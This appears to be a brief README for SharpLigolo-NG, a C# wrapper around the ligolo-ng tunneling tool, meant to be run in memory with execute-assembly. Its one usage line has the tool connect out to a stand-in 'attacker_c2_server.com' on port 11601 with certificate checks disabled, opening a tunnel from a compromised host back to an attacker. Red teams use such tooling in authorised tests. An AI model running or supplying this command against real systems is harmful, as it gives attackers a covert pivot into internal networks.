# SharpLigolo-NG

A C# wrapper for https://github.com/nicocha30/ligolo-ng

Can be built and executed via `execute-assembly`

```shell
execute-assembly /tmp/SharpLigoloNG.exe -connect attacker_c2_server.com:11601 -ignore-cert
```
